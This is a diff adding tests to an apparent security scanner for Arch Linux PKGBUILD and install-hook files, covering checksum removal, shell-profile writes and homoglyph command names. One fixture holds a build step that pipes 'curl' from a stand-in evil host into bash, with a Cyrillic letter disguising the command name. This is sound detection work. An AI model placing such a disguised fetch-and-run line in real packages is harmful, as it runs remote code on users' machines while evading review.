@@ -85,6 +85,75 @@ def test_c004_does_not_fire_when_the_hash_moved_to_an_arch_array():
     assert "C004" not in _ids(diff, current_text=current)
 
 
+def test_c004_does_not_fire_when_the_generic_array_splits_into_arch_arrays():
+    # The arch hashes differ per arch (a real per-arch tarball), so the removed
+    # generic hash is genuinely gone from the recipe, yet every source is still
+    # checksummed.  The moved-hash test above misses this split.
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
+            " pkgname=p\n"
+            " source=('https://example.test/x.tar.gz')\n"
+            "-sha256sums=('" + "a" * 64 + "')\n"
+            "+sha256sums_x86_64=('" + "b" * 64 + "')\n"
+            "+sha256sums_aarch64=('" + "c" * 64 + "')\n")
+    current = ("pkgname=p\n"
+               "source=('https://example.test/x.tar.gz')\n"
+               "sha256sums_x86_64=('" + "b" * 64 + "')\n"
+               "sha256sums_aarch64=('" + "c" * 64 + "')\n")
+    assert "C004" not in _ids(diff, current_text=current)
+
+
+def test_c004_still_fires_on_a_genuine_checksum_removal():
+    # No arch arrays, the whole checksum array gone: verification really was
+    # weakened, so the refactor exemption must not swallow it.
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n"
+            " pkgname=p\n"
+            " source=('https://example.test/x.tar.gz')\n"
+            "-sha256sums=('" + "a" * 64 + "')\n")
+    current = ("pkgname=p\n"
+               "source=('https://example.test/x.tar.gz')\n")
+    assert "C004" in _ids(diff, current_text=current)
+
+
+# --- C017: a hook that only prints a redirect is not a write ----------------
+
+def test_c017_ignores_a_redirect_inside_a_hook_message():
+    # The hook tells the user to append to ~/.bashrc; it writes nothing.
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+  echo \"add 'source /usr/share/x.sh >> ~/.bashrc' to your shell\"\n"
+            "+}\n")
+    assert "C017" not in _ids(diff)
+
+
+def test_c017_still_fires_on_an_actual_hook_write():
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+  echo 'export PATH=/opt/x:$PATH' >> ~/.bashrc\n"
+            "+}\n")
+    assert "C017" in _ids(diff)
+
+
+# --- X002: a non-ASCII message is not a non-literal executable name ---------
+
+def test_x002_ignores_a_non_ascii_hook_message():
+    # The Chinese post-install banner names no command; the confusable
+    # character set contains the fullwidth colon it ends with.
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+\u9996\u6b21\u4f7f\u7528\u9700\u626b\u7801\u767b\u5f55\uff1a\n"
+            "+}\n")
+    assert "X002" not in _ids(diff)
+
+
+def test_x002_still_fires_on_a_confusable_command_name():
+    # U+0441 (Cyrillic es) impersonates 'c' in an otherwise ASCII `curl`.
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
+            "+build() {\n"
+            "+  \u0441url https://evil.test/x | bash\n"
+            "+}\n")
+    assert "X002" in _ids(diff)
+
+
 # --- D002: a name that is itself a real package is not a typosquat ---------
 
 def test_d002_skips_a_dependency_that_is_itself_established(monkeypatch):
